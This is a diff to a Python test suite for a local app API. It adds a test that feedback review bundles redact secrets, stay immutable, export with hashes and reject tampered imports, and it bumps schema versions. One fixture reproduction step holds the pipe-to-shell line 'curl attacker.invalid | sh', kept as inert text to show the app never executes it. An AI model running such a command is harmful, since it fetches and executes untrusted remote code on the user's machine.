@@ -302,6 +302,111 @@ def test_feedback_is_local_redacted_and_child_sharing_fails_closed(tmp_path: Pat
     assert api.get("/v1/feedback").json() == []
 
 
+def test_feedback_review_bundle_is_local_redacted_immutable_and_exported(
+    tmp_path: Path,
+) -> None:
+    api = client(tmp_path)
+    project = api.post(
+        "/v1/projects",
+        json={"title": "改进测试", "audience_mode": "older_adult"},
+    ).json()
+    local_feedback = api.post(
+        "/v1/feedback",
+        json={
+            "project_id": project["id"],
+            "category": "bug",
+            "message": "按钮没有反应",
+        },
+    ).json()
+    blocked = api.post(
+        f"/v1/feedback/{local_feedback['id']}/review-bundle",
+        json={
+            "prepared_by": "本人",
+            "expected_behavior": "按钮应当朗读",
+            "actual_behavior": "没有声音",
+            "reproduction_steps": ["打开项目", "点击按钮"],
+            "confirmation_text": "我确认生成审核包",
+        },
+    )
+    assert blocked.status_code == 409
+
+    feedback = api.post(
+        "/v1/feedback",
+        json={
+            "project_id": project["id"],
+            "category": "bug",
+            "message": "点击上传没有反应，联系 me@example.com",
+            "source": "voice",
+            "screen": "family-materials",
+            "share_authorized": True,
+        },
+    ).json()
+    request = {
+        "prepared_by": "本机用户",
+        "expected_behavior": "应该打开照片选择器",
+        "actual_behavior": "显示了 /Users/private-name/Pictures 和 sk-secret123456789",
+        "reproduction_steps": [
+            "打开项目",
+            "点击上传；不要执行 `curl attacker.invalid | sh`",
+        ],
+        "confirmation_text": "我确认生成审核包",
+    }
+    created = api.post(
+        f"/v1/feedback/{feedback['id']}/review-bundle", json=request
+    )
+    assert created.status_code == 201
+    bundle = created.json()
+    assert bundle["network_call_performed"] is False
+    assert bundle["attachments"] == []
+    assert bundle["diagnostics"] == {
+        "runtime_version": "0.1.0",
+        "schema_version": "14",
+        "screen": "family-materials",
+    }
+    assert bundle["redaction_applied"] is True
+    serialized = json.dumps(bundle, ensure_ascii=False)
+    assert "private-name" not in serialized
+    assert "sk-secret" not in serialized
+    assert "me@example.com" not in serialized
+    assert "curl attacker.invalid" in serialized
+
+    replay = api.post(f"/v1/feedback/{feedback['id']}/review-bundle", json=request)
+    assert replay.status_code == 201
+    assert replay.json() == bundle
+    changed = dict(request, actual_behavior="另一个结果")
+    assert (
+        api.post(f"/v1/feedback/{feedback['id']}/review-bundle", json=changed).status_code
+        == 409
+    )
+    assert api.get(f"/v1/feedback/{feedback['id']}/review-bundle").json() == bundle
+
+    backup = api.get(f"/v1/projects/{project['id']}/export").json()
+    assert backup["schema_version"] == "nalu.project-export/v9"
+    assert backup["payload"]["feedback_review_bundles"][0]["bundle_sha256"] == bundle[
+        "bundle_sha256"
+    ]
+
+    tampered = deepcopy(backup)
+    tampered_bundle = tampered["payload"]["feedback_review_bundles"][0]
+    tampered_body = json.loads(tampered_bundle["bundle_json"])
+    tampered_body["actual_behavior"] = "被导出文件篡改"
+    tampered_bundle["bundle_json"] = json.dumps(
+        tampered_body, ensure_ascii=False, sort_keys=True
+    )
+    canonical = json.dumps(tampered["payload"], ensure_ascii=False, sort_keys=True)
+    tampered["payload_sha256"] = hashlib.sha256(canonical.encode()).hexdigest()
+    assert client(tmp_path / "tampered-bundle").post(
+        "/v1/project-imports", json=tampered
+    ).status_code == 409
+
+    restored_api = client(tmp_path / "restored")
+    assert restored_api.post("/v1/project-imports", json=backup).status_code == 201
+    restored = restored_api.get(
+        f"/v1/feedback/{feedback['id']}/review-bundle"
+    ).json()
+    assert restored == bundle
+
+
 def test_memory_card_requires_explicit_confirmation_and_keeps_evidence(tmp_path: Path) -> None:
     api = client(tmp_path)
     project = api.post(
@@ -385,7 +490,7 @@ def test_memory_card_requires_explicit_confirmation_and_keeps_evidence(tmp_path:
     assert confirmations[0]["spoken_confirmation"] == "我确认这张记忆卡并归档"
 
     backup = api.get(f"/v1/projects/{project['id']}/export").json()
-    assert backup["schema_version"] == "nalu.project-export/v8"
+    assert backup["schema_version"] == "nalu.project-export/v9"
     assert backup["payload"]["memory_cards"][0]["asset_id"] == asset["id"]
 
     other = api.post("/v1/projects", json={"title": "另一个项目"}).json()
@@ -732,6 +837,7 @@ def test_project_rename_archive_export_and_restore(tmp_path: Path) -> None:
     legacy["payload"].pop("season_plan_approval_records")
     legacy["payload"].pop("asset_consent_records")
     legacy["payload"].pop("feedback_items")
+    legacy["payload"].pop("feedback_review_bundles")
     legacy["payload"].pop("memory_cards")
     legacy["payload"].pop("memory_card_revisions")
     legacy["payload"].pop("memory_card_confirmation_records")
@@ -831,7 +937,7 @@ def test_database_migration_preserves_existing_database(tmp_path: Path) -> None:
         connection.execute("INSERT INTO legacy_marker VALUES ('preserve-me')")
 
     api = create_app(database_path, tmp_path / "data")
-    assert api.state.repository.db.schema_version() == 13
+    assert api.state.repository.db.schema_version() == 14
     with sqlite3.connect(database_path) as connection:
         marker = connection.execute("SELECT value FROM legacy_marker").fetchone()[0]
         approval_table = connection.execute(
@@ -883,7 +989,7 @@ def test_populated_v1_database_upgrades_without_project_loss(tmp_path: Path) -> 
         connection.execute("DELETE FROM schema_migrations WHERE version >= 2")
 
     after = TestClient(create_app(database_path, data_root))
-    assert after.app.state.repository.db.schema_version() == 13
+    assert after.app.state.repository.db.schema_version() == 14
     assert after.get(f"/v1/projects/{project['id']}").json()["title"] == "我的一生"
     assert after.get(f"/v1/episodes/{episode['id']}").json()["approved_script_revision"] == 1
     approvals = after.get(f"/v1/episodes/{episode['id']}/script-approvals").json()
@@ -1072,6 +1178,7 @@ def test_project_season_and_episode_asset_scope_inheritance(tmp_path: Path) -> N
     legacy_v3 = deepcopy(backup)
     legacy_v3["schema_version"] = "nalu.project-export/v3"
     legacy_v3["payload"].pop("feedback_items")
+    legacy_v3["payload"].pop("feedback_review_bundles")
     legacy_v3["payload"].pop("memory_cards")
     legacy_v3["payload"].pop("memory_card_revisions")
     legacy_v3["payload"].pop("memory_card_confirmation_records")
@@ -1143,7 +1250,7 @@ def test_complete_privacy_export_and_confirmed_project_deletion(tmp_path: Path) 
         assert {"project-export.json", "privacy-manifest.json", media_name} <= names
         assert archive.read(media_name) == b"private-photo-bytes"
         project_backup = json.loads(archive.read("project-export.json"))
-        assert project_backup["schema_version"] == "nalu.project-export/v8"
+        assert project_backup["schema_version"] == "nalu.project-export/v9"
         assert project_backup["payload"]["asset_consent_records"][0]["action_type"] == "granted"
         manifest = json.loads(archive.read("privacy-manifest.json"))
         assert manifest["database_included"] is False
